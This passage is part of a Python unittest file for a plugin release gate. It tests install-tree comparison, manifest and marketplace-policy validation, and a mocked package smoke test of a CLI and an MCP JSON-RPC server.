            (installed / ".codex-plugin").mkdir(parents=True)
            (source / ".codex-plugin" / "plugin.json").write_text(
                json.dumps(
                    {"name": "plot-rag-gate", "version": "1.4.2"}
                ),
                encoding="utf-8",
            )
            (installed / ".codex-plugin" / "plugin.json").write_text(
                "{",
                encoding="utf-8",
            )

            issues = release_gate.verify_install(source, installed)

        self.assertEqual(
            ["INSTALLED_MANIFEST_INVALID"],
            [issue.code for issue in issues],
        )

    def test_verify_install_rejects_invalid_marketplace_policy_and_category(
        self,
    ) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            source = root / "plugins" / "plot-rag-gate"
            installed = root / "cache" / "plot-rag-gate"
            marketplace = root / ".agents" / "plugins" / "marketplace.json"
            (source / ".codex-plugin").mkdir(parents=True)
            (source / "scripts").mkdir()
            marketplace.parent.mkdir(parents=True)
            (source / ".codex-plugin" / "plugin.json").write_text(
                json.dumps(
                    {"name": "plot-rag-gate", "version": "1.4.2"}
                ),
                encoding="utf-8",
            )
            (source / "scripts" / "runtime.py").write_text(
                "STATE = 'same'\n",
                encoding="utf-8",
            )
            marketplace.write_text(
                json.dumps(
                    {
                        "plugins": [
                            {
                                "name": "plot-rag-gate",
                                "source": {
                                    "source": "local",
                                    "path": "./plugins/plot-rag-gate",
                                },
                                "policy": {
                                    "installation": "BOGUS",
                                    "authentication": None,
                                },
                                "category": "",
                            }
                        ]
                    }
                ),
                encoding="utf-8",
            )
            shutil.copytree(source, installed)
            _init_git(source)
            _stage(
                source,
                ".codex-plugin/plugin.json",
                "scripts/runtime.py",
            )

            issues = release_gate.verify_install(
                source,
                installed,
                marketplace=marketplace,
            )

        codes = {issue.code for issue in issues}
        self.assertIn("MARKETPLACE_POLICY_INVALID", codes)
        self.assertIn("MARKETPLACE_CATEGORY_INVALID", codes)

    def test_marketplace_and_install_comparison_are_path_portable(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            source = root / "plugins" / "plot-rag-gate"
            installed = root / "cache" / "plot-rag-gate"
            marketplace = root / ".agents" / "plugins" / "marketplace.json"
            (source / ".codex-plugin").mkdir(parents=True)
            (source / "scripts").mkdir()
            marketplace.parent.mkdir(parents=True)
            manifest = {"name": "plot-rag-gate", "version": "1.4.1"}
            (source / ".codex-plugin" / "plugin.json").write_text(
                json.dumps(manifest),
                encoding="utf-8",
            )
            (source / "scripts" / "runtime.py").write_text(
                "STATE = 'same'\n",
                encoding="utf-8",
            )
            marketplace.write_text(
                json.dumps(
                    {
                        "name": "personal",
                        "plugins": [
                            {
                                "name": "plot-rag-gate",
                                "source": {
                                    "source": "local",
                                    "path": "./plugins/plot-rag-gate",
                                },
                                "policy": {
                                    "installation": "AVAILABLE",
                                    "authentication": "ON_USE",
                                },
                                "category": "Writing",
                            }
                        ],
                    }
                ),
                encoding="utf-8",
            )
            shutil.copytree(source, installed)
            _init_git(source)
            _stage(
                source,
                ".codex-plugin/plugin.json",
                "scripts/runtime.py",
            )

            self.assertEqual(
                [],
                release_gate.verify_install(
                    source,
                    installed,
                    marketplace=marketplace,
                ),
            )
            (installed / "scripts" / "runtime.py").write_text(
                "STATE = 'drift'\n",
                encoding="utf-8",
            )
            issues = release_gate.verify_install(
                source,
                installed,
                marketplace=marketplace,
            )

        self.assertIn(
            "INSTALLED_FILE_MISMATCH",
            {issue.code for issue in issues},
        )

    def test_install_comparison_reports_missing_and_unexpected_files(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            source = root / "source"
            installed = root / "installed"
            source.mkdir()
            installed.mkdir()
            (source / "required.txt").write_text("required", encoding="utf-8")
            (installed / "extra.txt").write_text("extra", encoding="utf-8")

            comparison = release_gate.compare_install_tree(
                source,
                installed,
                files=("required.txt",),
            )

        self.assertEqual(("required.txt",), comparison.missing)
        self.assertEqual(("extra.txt",), comparison.unexpected)
        self.assertFalse(comparison.ok)

    def test_install_comparison_reports_bytecode_cache_as_unexpected(
        self,
    ) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            source = root / "source"
            installed = root / "installed"
            (source / "scripts").mkdir(parents=True)
            (installed / "scripts" / "__pycache__").mkdir(parents=True)
            (source / "scripts" / "runtime.py").write_text(
                "STATE = 'same'\n",
                encoding="utf-8",
            )
            (installed / "scripts" / "runtime.py").write_text(
                "STATE = 'same'\n",
                encoding="utf-8",
            )
            bytecode = (
                installed
                / "scripts"
                / "__pycache__"
                / "runtime.cpython-310.pyc"
            )
            bytecode.write_bytes(b"executable bytecode")

            comparison = release_gate.compare_install_tree(
                source,
                installed,
                files=("scripts/runtime.py",),
            )

        self.assertEqual(
            ("scripts/__pycache__/runtime.cpython-310.pyc",),
            comparison.unexpected,
        )
        self.assertFalse(comparison.ok)

    def test_package_roundtrip_preserves_payload_hashes(self) -> None:
        with _staged_worktree_index(PLUGIN_ROOT):
            comparison = release_gate.package_roundtrip(PLUGIN_ROOT)
        self.assertTrue(comparison.ok, comparison)

    def test_package_smoke_starts_extracted_cli_and_mcp(self) -> None:
        with _staged_worktree_index(PLUGIN_ROOT):
            self.assertEqual([], release_gate.package_smoke(PLUGIN_ROOT))

    def test_package_smoke_uses_extracted_manifest_mcp_entrypoint(
        self,
    ) -> None:
        cli = subprocess.CompletedProcess(
            args=[],
            returncode=0,
            stdout="plot-rag-gate 1.4.2 (runtime schema 1)\n",
            stderr="",
        )
        mcp = subprocess.CompletedProcess(
            args=[],
            returncode=0,
            stdout="\n".join(
                [
                    json.dumps(
                        {
                            "jsonrpc": "2.0",
                            "id": 1,
                            "result": {
                                "serverInfo": {
                                    "name": "plot-rag-state",
                                    "version": "1.4.2",
                                }
                            },
                        }
                    ),
                    json.dumps(
                        {
                            "jsonrpc": "2.0",
                            "id": 2,
                            "result": {
                                "tools": [
                                    {"name": "list_power_systems"},
                                    *[
                                        {"name": name}
                                        for name in sorted(
                                            release_gate.POWER_SPEC_REQUIRED_MCP_TOOLS
                                        )
                                    ],
                                ]
                            },
                        }
                    ),
                    json.dumps(
                        {
                            "jsonrpc": "2.0",
                            "id": 3,
                            "result": {
                                "structuredContent": {
                                    "status": "OK",
                                    "systems": [],
                                }
                            },
                        }
                    ),
                    json.dumps(
                        {
                            "jsonrpc": "2.0",
                            "id": 4,
                            "result": {
                                "structuredContent": {
                                    "status": "ready",
                                    "read_only": True,
                                    "summary": {"event_count": 1},
                                }
                            },
                        }
                    ),
                ]
            )
            + "\n",
            stderr="",
        )
        with tempfile.TemporaryDirectory() as temporary:
            fixture = Path(temporary) / "fixture"
            (fixture / ".codex-plugin").mkdir(parents=True)
            (fixture / "config").mkdir()
            (fixture / "scripts").mkdir()
            (fixture / "templates").mkdir()
            (fixture / ".codex-plugin" / "plugin.json").write_text(
                json.dumps(
                    {
                        "name": "plot-rag-gate",
                        "version": "1.4.2",
                        "mcpServers": "./config/custom-mcp.json",
                    }
                ),
                encoding="utf-8",
            )
            (fixture / "config" / "custom-mcp.json").write_text(
                json.dumps(
                    {
                        "mcpServers": {
                            "plot-rag-state": {
                                "command": "python3",
                                "args": list(
                                    release_gate.EXPECTED_MCP_ARGUMENTS
                                ),
                                "cwd": ".",
                            }
                        }
                    }
                ),
                encoding="utf-8",
            )
            (fixture / "scripts" / "plot_rag_mcp.py").write_text(
                "pass\n",
                encoding="utf-8",
            )
            (fixture / "scripts" / "plot_state.py").write_text(
                "pass\n",
                encoding="utf-8",
            )
            (fixture / "templates" / "config.v3.json").write_text(
                "{}\n",
                encoding="utf-8",
            )
            with (
                patch.object(
                    release_gate,
                    "_extract_package_payload",
                    side_effect=lambda _root, destination: shutil.copytree(
                        fixture,
                        destination / "installed",
                    ),
                ),
                patch.object(
                    release_gate.subprocess,
                    "run",
                    side_effect=[cli, mcp],
                ) as run_mock,
                patch.object(
                    release_gate.shutil,
                    "which",
                    return_value="python3",
                ),
            ):
                issues = release_gate.package_smoke(fixture)

        self.assertEqual([], issues)
        mcp_call = run_mock.call_args_list[1]
        self.assertEqual(
            ["python3", *release_gate.EXPECTED_MCP_ARGUMENTS],
            mcp_call.args[0],
        )
        self.assertEqual("installed", Path(mcp_call.kwargs["cwd"]).name)

    def test_package_smoke_uses_running_python_when_alias_is_missing(
        self,
    ) -> None:
        environment = {"PATH": "/missing"}
        with patch.object(release_gate.shutil, "which", return_value=None):
            command = release_gate._smoke_python_command(
                "python",
                environment,
            )

        self.assertEqual(sys.executable, command)

    def test_package_smoke_rejects_top_level_tools_call_error(self) -> None:
        cli = subprocess.CompletedProcess(
            args=[],
            returncode=0,
            stdout="plot-rag-gate 1.4.3 (runtime schema 1)\n",
            stderr="",
        )
        mcp = subprocess.CompletedProcess(
            args=[],
            returncode=0,
            stdout="\n".join(
                [
                    json.dumps(
                        {
                            "jsonrpc": "2.0",
                            "id": 1,
                            "result": {
                                "serverInfo": {
                                    "name": "plot-rag-state",
                                    "version": "1.4.3",
                                }
                            },
                        }
                    ),
                    json.dumps(
                        {
                            "jsonrpc": "2.0",
                            "id": 2,
                            "result": {
                                "tools": [{"name": "list_power_systems"}]
                            },
                        }
                    ),
                    json.dumps(
                        {
                            "jsonrpc": "2.0",
                            "id": 3,
                            "error": {
                                "code": -32603,
                                "message": "fixture failure",
                            },
                        }
                    ),
                ]
            )
            + "\n",
            stderr="",
        )
        with (
            patch.dict(
                os.environ,
                {"PLOT_RAG_PROJECT_ROOT": "C:/contaminating-project"},
            ),
            patch.object(
                release_gate,
                "_extract_package_payload",
                side_effect=lambda root, temporary: shutil.copytree(
                    root,
                    temporary / "installed",
                    ignore=shutil.ignore_patterns(".git"),
                ),
            ),
            patch.object(
                release_gate.subprocess,
                "run",
                side_effect=[cli, mcp],
            ) as run_mock,
        ):
            issues = release_gate.package_smoke(PLUGIN_ROOT)
        self.assertIn(
            "PACKAGE_SMOKE_MCP_FAILED",
            {issue.code for issue in issues},
        )
        self.assertTrue(run_mock.call_args_list)
        self.assertTrue(
            all(
                "PLOT_RAG_PROJECT_ROOT" not in call.kwargs["env"]
                for call in run_mock.call_args_list
            )
        )

    def test_package_smoke_turns_process_timeout_into_gate_issue(self) -> None:
        mcp = subprocess.CompletedProcess(
            args=[],
            returncode=0,
            stdout="\n".join(
                [
                    json.dumps(
                        {
                            "jsonrpc": "2.0",
                            "id": 1,
                            "result": {
                                "serverInfo": {
                                    "name": "plot-rag-state",
                                    "version": "1.4.3",
                                }
                            },
                        }
                    ),
                    json.dumps(
                        {
                            "jsonrpc": "2.0",
                            "id": 2,
                            "result": {
                                "tools": [{"name": "list_power_systems"}]
                            },
                        }
                    ),
                    json.dumps(
                        {
                            "jsonrpc": "2.0",
                            "id": 3,
                            "result": {
                                "structuredContent": {
                                    "status": "uninitialized",
                                    "systems": [],
                                }
                            },
                        }
                    ),
                ]
            )
            + "\n",
            stderr="",
        )
        with (
            patch.object(
                release_gate,
                "_extract_package_payload",
                side_effect=lambda root, temporary: shutil.copytree(
                    root,
                    temporary / "installed",
                    ignore=shutil.ignore_patterns(".git"),
                ),
            ),
            patch.object(
                release_gate.subprocess,
                "run",
                side_effect=[
                    subprocess.TimeoutExpired("plot_state.py", 20),
                    mcp,
                ],
            ),
        ):
            issues = release_gate.package_smoke(PLUGIN_ROOT)
        self.assertIn(
            "PACKAGE_SMOKE_CLI_FAILED",
            {issue.code for issue in issues},
        )

    def test_package_smoke_rejects_non_object_jsonrpc_results(self) -> None:
        cli = subprocess.CompletedProcess(
            args=[],
            returncode=0,
            stdout="plot-rag-gate 1.4.3 (runtime schema 1)\n",
            stderr="",
        )
        mcp = subprocess.CompletedProcess(
            args=[],
            returncode=0,
            stdout="\n".join(
                [
                    json.dumps({"jsonrpc": "2.0", "id": 1, "result": []}),
                    json.dumps({"jsonrpc": "2.0", "id": 2, "result": []}),
                    json.dumps({"jsonrpc": "2.0", "id": 3, "result": []}),
                ]
            )
            + "\n",
            stderr="",
        )
        with (
            patch.object(
                release_gate,
                "_extract_package_payload",
                side_effect=lambda root, temporary: shutil.copytree(
                    root,
                    temporary / "installed",
                    ignore=shutil.ignore_patterns(".git"),
                ),
            ),
            patch.object(
                release_gate.subprocess,
                "run",
                side_effect=[cli, mcp],
            ),
        ):
            issues = release_gate.package_smoke(PLUGIN_ROOT)
        self.assertIn(
            "PACKAGE_SMOKE_MCP_FAILED",
            {issue.code for issue in issues},
        )

    def test_package_smoke_rejects_boolean_jsonrpc_response_id(self) -> None:
        cli = subprocess.CompletedProcess(
            args=[],
            returncode=0,
            stdout="plot-rag-gate 1.4.3 (runtime schema 1)\n",
            stderr="",
        )
        mcp = subprocess.CompletedProcess(
            args=[],
            returncode=0,
            stdout="\n".join(
                [
                    json.dumps(
                        {
                            "jsonrpc": "2.0",
                            "id": True,
                            "result": {
                                "serverInfo": {
                                    "name": "plot-rag-state",
                                    "version": "1.4.3",
                                }
                            },
                        }
                    ),
                    json.dumps(
                        {
                            "jsonrpc": "2.0",
                            "id": 2,
                            "result": {
                                "tools": [{"name": "list_power_systems"}]
                            },
                        }
                    ),
                    json.dumps(
                        {
                            "jsonrpc": "2.0",
                            "id": 3,
                            "result": {
                                "structuredContent": {
                                    "status": "OK",
                                    "systems": [],
                                }
                            },
                        }
                    ),
                ]
            )
            + "\n",
            stderr="",
        )
        with (
            patch.object(
                release_gate,
                "_extract_package_payload",
                side_effect=lambda root, temporary: shutil.copytree(
                    root,
                    temporary / "installed",
                    ignore=shutil.ignore_patterns(".git"),
                ),
            ),
            patch.object(
                release_gate.subprocess,
                "run",
                side_effect=[cli, mcp],
            ),
        ):
            issues = release_gate.package_smoke(PLUGIN_ROOT)
        self.assertIn(
            "PACKAGE_SMOKE_MCP_FAILED",
            {issue.code for issue in issues},
        )


if __name__ == "__main__":
    unittest.main()
